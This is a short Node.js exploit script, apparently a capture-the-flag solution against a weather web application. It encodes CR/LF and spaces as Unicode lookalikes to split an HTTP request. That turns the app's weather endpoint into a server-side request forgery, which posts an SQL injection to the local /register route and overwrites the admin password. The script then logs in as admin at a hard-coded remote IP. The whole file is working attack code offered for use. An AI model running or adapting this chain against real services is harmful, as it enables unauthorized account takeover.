// const HttpHelper = require('../helpers/HttpHelper');
const axios = require('axios');
 
const PASSWORD = 'YEET';
// const REMOTE_HOST = '127.0.0.1:1337';
const REMOTE_HOST = '159.65.54.50:32036';
const LOCAL_HOST = '127.0.0.1:80';

(async () => {

    payload = `{"username":"admin","password":"unused') ON CONFLICT(username) DO UPDATE SET password='${PASSWORD}'; -- comment"}`
        .split('{').join('\u{017B}')
        .split('}').join('\u{017D}')
        .split('"').join('\u{0122}')
        .split(' ').join('\u{0120}')
        .split('\'').join('\u{0127}')

    endpoint = [
        `${LOCAL_HOST}/\u{0120}HTTP/1.1`,
        `Host:${LOCAL_HOST}`,
        '',
        'POST\u{0120}/register\u{0120}HTTP/1.1',
        `Host:${LOCAL_HOST}`,
        'Content-Type:application/json',
        `Content-Length:${payload.length}`,
        '',
        payload,
        '',
        `GET\u{0120}/`
    ]
        .join('\u{010D}\u{010A}')

    // await HttpHelper.HttpGet('http://' + endpoint);

    const exploit = await axios.post(
        `http://${REMOTE_HOST}/api/weather`,
        {
            endpoint,
            city: 'a',
            country: 'a',
        }
    );
    console.log(`Exploit - ${exploit.status}: ${JSON.stringify(exploit.data)}`);

    // await new Promise(resolve => setTimeout(resolve, 1000));

    const login = await axios.post(
        `http://${REMOTE_HOST}/login`,
        {
            username: 'admin',
            password: PASSWORD,
        }
    )
    console.log(`Login - ${login.status}: ${JSON.stringify(login.data)}`)

})()
    .then(data => console.log(data))
    .catch(err => console.error(err))